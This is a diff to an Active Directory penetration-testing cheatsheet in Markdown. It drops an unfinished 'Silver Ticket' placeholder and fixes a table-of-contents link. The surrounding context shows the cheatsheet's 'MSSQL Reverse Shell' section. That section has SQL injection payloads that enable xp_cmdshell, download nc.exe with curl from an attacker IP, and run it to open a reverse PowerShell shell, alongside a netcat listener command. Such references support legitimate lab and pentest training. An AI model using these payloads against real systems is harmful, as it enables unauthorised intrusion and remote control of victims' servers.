@@ -31,8 +31,7 @@ tags:   [Cheatsheets, Tools, Active-Directory, Active-Directory-Enumeration, SMB
 - [Local Credential Dumping](#local-credential-dumping)
 - [MSSQL Basics](#mssql-basics)
 - [MSSQL Reverse Shell](#mssql-reverse-shell)
-- [Silver Ticket](#silver-ticket)
-- [ACLs Abuse Attacks](#acl-abuse-attacks)
+- [ACLs Abuse Attacks](#acls-abuse-attacks)
 
 ### Identifying the Domain Controller
 ```shell
@@ -692,10 +691,6 @@ nc -lvnp 443
 ' EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- //
 ' EXECUTE xp_cmdshell "curl http://192.168.45.200:8080/nc.exe -o C:\\Users\\Public\\nc.exe"; -- //
 ' EXECUTE xp_cmdshell "C:\\Users\\Public\\nc.exe -nv 192.168.45.200 443 -e powershell.exe"; -- //
-```
-### Silver Ticket
-```shell
-Comming soon.
 ```
 ### ACLs Abuse Attacks
 Note: We can enumerate ACLs using BloodHound too. But using PowerView.ps1 can give us some results that wouldn't show up on BloodHound otherwise.
